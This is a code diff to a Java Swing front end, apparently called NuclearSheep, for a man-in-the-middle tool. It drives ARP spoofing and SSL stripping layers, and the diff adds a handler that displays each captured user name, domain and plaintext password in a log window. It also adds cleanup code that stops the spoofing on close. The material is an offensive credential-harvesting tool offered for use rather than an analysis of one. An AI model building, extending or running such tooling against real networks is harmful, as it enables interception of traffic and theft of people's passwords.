@@ -11,10 +11,14 @@
 package org.hatchunc.nuclearsheep;
 
 import java.awt.Color;
+import java.awt.event.WindowAdapter;
+import java.awt.event.WindowEvent;
 import java.io.IOException;
 import java.util.LinkedList;
 import java.util.List;
+import javax.swing.JFrame;
 import javax.swing.ListSelectionModel;
+import javax.swing.text.DefaultCaret;
 import jpcap.NetworkInterface;
 
 /**
@@ -22,7 +26,7 @@ import jpcap.NetworkInterface;
  * @author colin
  */
 @SuppressWarnings("serial")
-public class NuclearSheep extends javax.swing.JFrame {
+public class NuclearSheep extends javax.swing.JFrame implements UserInfoListener {
 
 	ARPSpoofLayer arp;
 	SSLStripLayer strip;
@@ -44,9 +48,7 @@ public class NuclearSheep extends javax.swing.JFrame {
 			try {
 				strip.stopSSLStrip();
 				arp.stopARPSpoofs();
-			} catch (IOException e1) {
-				System.exit(0);
-			}
+			} catch (IOException e2) { }
 			System.exit(0);
 		}
     	try {
@@ -55,6 +57,20 @@ public class NuclearSheep extends javax.swing.JFrame {
 			System.exit(0);
 		}
     	pairs = arp.getIPMACPairs();
+    	strip.registerUserInfoListener(this);
+    	
+    	//disable the close button
+    	this.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
+    	//create custom close operation
+    	this.addWindowListener(new WindowAdapter() {
+    	      public void windowClosing(WindowEvent e) {
+    				try {
+    					strip.stopSSLStrip();
+    					arp.stopARPSpoofs();
+    				} catch (IOException e2) { }
+    				System.exit(0);
+    	      }
+    	});
     	
     	initComponents();
     }
@@ -128,6 +144,9 @@ public class NuclearSheep extends javax.swing.JFrame {
 
         jTextArea1.setColumns(20);
         jTextArea1.setRows(5);
+        jTextArea1.setEditable(false);
+        DefaultCaret caret = (DefaultCaret)jTextArea1.getCaret();
+        caret.setUpdatePolicy(DefaultCaret.ALWAYS_UPDATE);
         jScrollPane1.setViewportView(jTextArea1);
         
         listSelectionModel = jList1.getSelectionModel();
@@ -214,9 +233,11 @@ private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {
 	}
 	else{
 		try {
-			strip.stopSSLStrip();
 			arp.stopARPSpoofs();
 		} catch (IOException e) {
+			try {
+				strip.stopSSLStrip();
+			} catch (IOException e2) { }
 			System.exit(0);
 		}
 		jButton1.setText("Nuke");
@@ -284,4 +305,11 @@ private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {
     private java.awt.MenuBar menuBar2;*/
     private org.jdesktop.beansbinding.BindingGroup bindingGroup;
     // End of variables declaration
+
+
+	@Override
+	public void receiveNewUserInfo(UserInfo info) {
+		jTextArea1.setText(jTextArea1.getText() + (jTextArea1.getText().equals("") ? "" : "\n") +
+							info.userName + " logged onto " + info.domain + " with password: " + info.password);
+	}
 }
